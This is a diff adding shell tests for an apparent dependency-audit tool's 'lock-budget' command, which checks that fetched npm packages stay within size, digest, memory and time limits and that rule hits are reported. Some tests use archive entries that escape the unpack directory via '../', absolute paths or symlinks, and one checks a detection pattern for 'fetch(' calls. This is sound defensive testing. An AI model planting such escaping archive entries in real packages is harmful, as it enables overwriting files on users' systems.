+check "... an entry whose name is not UTF-8 does not stop the report" sh -c "[ '$RC' = 1 ] && grep -q '^1. npm lb-twotop - -> 1.0.0 \[direct\] SC-059 0, SC-060 ' '$LBR'"
+check "lock-budget: a package the registry has no record of is flagged as not listed, not left unchecked" \
+  sh -c "grep -q '; not listed by the registry: 1\$' '$T/out' && grep -q '^  not listed by the registry: npm lb-gone 3.0.0 (package-lock.json)\$' '$LBR'"
+LBN=109
+lb_set "$LBN" 'npm	package-lock.json	lb-flaky	-	1.0.0	-	public	-' 'npm	package-lock.json	lb-notime	-	1.0.0	-	public	-'
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget: a lookup that fails twice, and a version with no publish time, count as not checked, and the call goes on" \
+  sh -c "[ '$RC' = 0 ] && grep -q '^>> publish age: 2 names asked in [0-9]* s; not checked: 2 of 2 rows (HTTP 500 from https://registry.npmjs.org/lb-flaky, no publish time);' '$T/out' && [ \$(grep -c '^url: https://registry.npmjs.org/lb-flaky\$' '$T/calls') = 2 ]"
+LBN=111
+lb_set "$LBN" 'npm	package-lock.json	lb-big	-	1.0.0	-	public	direct' 'npm	package-lock.json	lb-huge	-	1.0.0	-	public	direct' \
+  'npm	package-lock.json	lb-baddigest	-	1.0.0	-	public	direct' 'npm	package-lock.json	lb-bigold	-	1.0.0	-	public	direct'
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/.*; output audit_1\/deps\/lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/err")
+LBR=$WT/audit_1/deps/lock-budget-$n.txt
+check "lock-budget: a download over 50 MB, more than the call's 500 MB unpacked and a digest that does not match each fail, exit 3" \
+  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: 4 of 4 selected artifacts could not be fetched; output ' '$T/err' && grep -qxF '  not fetched: npm lb-big 1.0.0: the artifact at https://registry.npmjs.org/lb-big/-/lb-big-1.0.0.tgz is larger than 50 MB' '$LBR' && grep -qxF '  not fetched: npm lb-huge 1.0.0: the artifacts of this call would unpack to more than 500 MB' '$LBR' && grep -q '^  not fetched: npm lb-baddigest 1.0.0: the digest does not match: ' '$LBR'"
+check "... a size failure is not retried, a digest that does not match is" \
+  sh -c "[ \$(grep -c '^url: https://registry.npmjs.org/lb-big/-/lb-big-1.0.0.tgz\$' '$T/calls') = 1 ] && [ \$(grep -c '^url: https://registry.npmjs.org/lb-huge/-/lb-huge-1.0.0.tgz\$' '$T/calls') = 1 ] && [ \$(grep -c '^url: https://registry.npmjs.org/lb-baddigest/-/lb-baddigest-1.0.0.tgz\$' '$T/calls') = 2 ]"
+check "... a download over 50 MB fails either way: curl refuses it (exit 63), or, whole from a server that gives no length to a curl before 8.4.0, it is measured" \
+  sh -c "grep -qxF 'GET https://registry.npmjs.org/lb-big/-/lb-big-1.0.0.tgz -> curl exit 63' '$WT/audit_1/deps/lock-budget-$n/requests.txt' && grep -qxF 'GET https://registry.npmjs.org/lb-bigold/-/lb-bigold-1.0.0.tgz -> 200' '$WT/audit_1/deps/lock-budget-$n/requests.txt' && grep -qxF '  not fetched: npm lb-bigold 1.0.0: the artifact at https://registry.npmjs.org/lb-bigold/-/lb-bigold-1.0.0.tgz is larger than 50 MB' '$LBR'"
+check "... none of the four is kept or unpacked" sh -c "[ -d '$WT/audit_1/deps/lock-budget-$n/4' ] && [ -z \"\$(find '$WT/audit_1/deps/lock-budget-$n' -mindepth 2 -print)\" ]"
+LBN=112
+lb_set "$LBN" 'npm	package-lock.json	lb-unsafe	-	1.0.0	-	public	direct'
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+LBR=$WT/audit_1/deps/lock-budget-$n.txt
+check "lock-budget: entries that climb out, sit at an absolute path or are links are left out and listed, each an SC-060 hit" \
+  sh -c "[ '$RC' = 1 ] && grep -q '^SC-060 package/../escape.txt:0: an entry left out of the unpacked files' '$LBR' && grep -q '^SC-060 /abs.txt:0: an entry left out' '$LBR' && grep -q '^SC-060 package/link:0: an entry left out' '$LBR' && [ -f '$WT/audit_1/deps/lock-budget-$n/1/new/files/package/index.js' ] && [ ! -e '$WT/audit_1/deps/lock-budget-$n/1/new/escape.txt' ] && [ -z \"\$(find '$WT/audit_1/deps/lock-budget-$n' ! -type f ! -type d -print)\" ]"
+check "... and the run directory still passes its check" sh -c "(cd '$WT' && '$ROOT/scripts/rundir.sh' check audit_1) >/dev/null"
+LBN=124
+lb_set "$LBN" 'npm	package-lock.json	lb-long	-	1.0.0	-	public	direct'
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/^>> lock-budget: .*lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/out")
+check "lock-budget: a line longer than the 1 MiB the sweep reads at once keeps one number, and the hit after it is on line 2" \
+  sh -c "[ '$RC' = 1 ] && grep -q '^SC-060 package/long.js:2: fetch(' '$WT/audit_1/deps/lock-budget-$n.txt' && grep -q '^1. npm lb-long - -> 1.0.0 \[direct\] SC-059 0, SC-060 1, binary 0;' '$WT/audit_1/deps/lock-budget-$n.txt'"
+# lock-budget writes under <R>/deps/ only, and its one row to disclosures.tsv; a set that is a link, or larger
+# than 64 MiB, is refused before anything is sent
+LBN=113
+lb_set "$LBN" 'npm	package-lock.json	lb-keyed	-	1.0.0	-	public	key'
+(cd "$WT/audit_1" && find . -path ./deps -prune -o -print | LC_ALL=C sort) > "$T/rd-before"
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+(cd "$WT/audit_1" && find . -path ./deps -prune -o -print | LC_ALL=C sort) > "$T/rd-after"
+check "lock-budget writes nothing in the run directory outside deps/ but its disclosure row" \
+  sh -c "[ '$RC' = 0 ] && cmp -s '$T/rd-before' '$T/rd-after' && [ -z \"\$(find '$WT' -path '$WT/audit_1' -prune -o -newer '$T/rd-before' -type f -print)\" ]"
+ln -s "lock-set-$LBN.tsv" "$WT/audit_1/deps/lock-set-114.tsv"
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-114.tsv
+check "lock-budget: a set that is a link is refused before any request" \
+  sh -c "[ '$RC' = 64 ] && grep -qxF 'deps: refused: the set passes through a symbolic link: audit_1/deps/lock-set-114.tsv' '$T/err' && [ ! -s '$T/calls' ]"
+rm -f "$WT/audit_1/deps/lock-set-114.tsv"
+dd if=/dev/zero of="$WT/audit_1/deps/lock-set-115.tsv" bs=1 count=0 seek=67108865 2>/dev/null
+run "$DEPS" "$WT" -- lock-budget --run audit_1 audit_1/deps/lock-set-115.tsv
+check "lock-budget: a set larger than 64 MiB is refused before any request" \
+  sh -c "[ '$RC' = 64 ] && grep -qxF 'deps: refused: the set is larger than 64 MiB: audit_1/deps/lock-set-115.tsv' '$T/err' && [ ! -s '$T/calls' ]"
+rm -f "$WT/audit_1/deps/lock-set-115.tsv"
+LBN=119
+lb_set "$LBN" 'npm	package-lock.json	lb-mem	-	1.0.0	-	public	direct'
+rm -rf "$NT" && mkdir -p "$NT"
+peak=$(cd "$WT" && python3 -I -c 'import resource, subprocess, sys
+subprocess.run(sys.argv[1:], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+r = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss
+print(int(r / (1 << 20) if sys.platform == "darwin" else r / 1024))' env -i HOME="$CLEANHOME" PATH="$FPATH" TMPDIR="$NT" AUDITOR_PUBLISH_AGE=off \
+  "${SHELLS[0]}" "$DEPS" lock-budget --run audit_1 "audit_1/deps/lock-set-$LBN.tsv")
+LBR=$(ls -t "$WT"/audit_1/deps/lock-budget-*.txt | sed -n 1p)
+check "lock-budget: the sweep of 120 MB of short lines peaks at ${peak:-?} MB, under half what it unpacks" \
+  sh -c "[ '${peak:-999}' -lt 60 ] && grep -qx '1. npm lb-mem - -> 1.0.0 \[direct\] SC-059 0, SC-060 0, binary 0; files +1 ~0 -0; no earlier public version: every file is new' '$LBR'"
+rm -rf "${LBR%.txt}"
+LBN=107
+lb_set "$LBN" 'npm	package-lock.json	lb-young	-	0.1.0	-	public	direct'
+run "$DEPS" "$WT" AUDITOR_RUN_TIMEOUT=3 -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+check "lock-budget out of time: no request, exit 3, the count and the reason given" \
+  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: 1 of 1 selected entries were not compared: the call reached its time limit; output ' '$T/err' && ! grep -q '^== curl' '$T/calls'"
+# the work of a call stops ten seconds before its end, so its report is written in time: 200 MB of 119-character
+# runs, one short of SC-060's 120, take far longer to sweep than AUDITOR_RUN_TIMEOUT=20 leaves
+LBN=120
+lb_set "$LBN" 'npm	package-lock.json	lb-slow	-	1.0.0	-	public	direct'
+t0=$(date +%s)
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off AUDITOR_RUN_TIMEOUT=20 -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+took=$(( $(date +%s) - t0 ))
+n=$(sed -n 's/.*; output audit_1\/deps\/lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/err")
+LBR=$WT/audit_1/deps/lock-budget-$n.txt
+check "lock-budget: a sweep still running at the time limit stops, its entry not compared: exit 3 after $took s, before the 20-second watchdog, the report written" \
+  sh -c "[ '$RC' = 3 ] && [ '$took' -lt 20 ] && grep -qxF 'deps: blocker: 1 of 1 selected entries were not compared: the call reached its time limit; output audit_1/deps/lock-budget-$n.txt' '$T/err' && grep -qxF '1. npm lb-slow - -> 1.0.0 [direct] not compared: the call reached its time limit' '$LBR' && grep -qxF '>> artifacts: 1 entries, 1 artifacts fetched, 0 failed; 1 entries not compared: the call reached its time limit' '$T/out' && [ -f '$WT/audit_1/deps/lock-budget-$n/1/new/files/package/slow' ]"
+rm -rf "$WT/audit_1/deps/lock-budget-$n"
+# once the call has unpacked its 500 MB, a later selected artifact fails at once, with no request
+LBN=121
+lb_set "$LBN" 'npm	package-lock.json	lb-fill	-	1.0.0	-	public	direct' 'npm	package-lock.json	lb-after	-	1.0.0	-	public	direct'
+run "$DEPS" "$WT" AUDITOR_PUBLISH_AGE=off -- lock-budget --run audit_1 audit_1/deps/lock-set-$LBN.tsv
+n=$(sed -n 's/.*; output audit_1\/deps\/lock-budget-\([0-9]*\)[.]txt$/\1/p' "$T/err")
+LBR=$WT/audit_1/deps/lock-budget-$n.txt
+check "lock-budget: once the call has unpacked its 500 MB, a later selected artifact fails at once, with no request" \
+  sh -c "[ '$RC' = 3 ] && grep -qxF '  not fetched: npm lb-after 1.0.0: the artifacts of this call would unpack to more than 500 MB' '$LBR' && ! grep -q 'lb-after' '$T/calls' && grep -qxF '1. npm lb-fill - -> 1.0.0 [direct] SC-059 0, SC-060 0, binary 1; files +1 ~0 -0; no earlier public version: every file is new' '$LBR'"
+rm -rf "$WT/audit_1/deps/lock-budget-$n"
 
 # =================================================================================================
 # sast.sh: semgrep with allowlisted rulesets, its SARIF in R/sast.
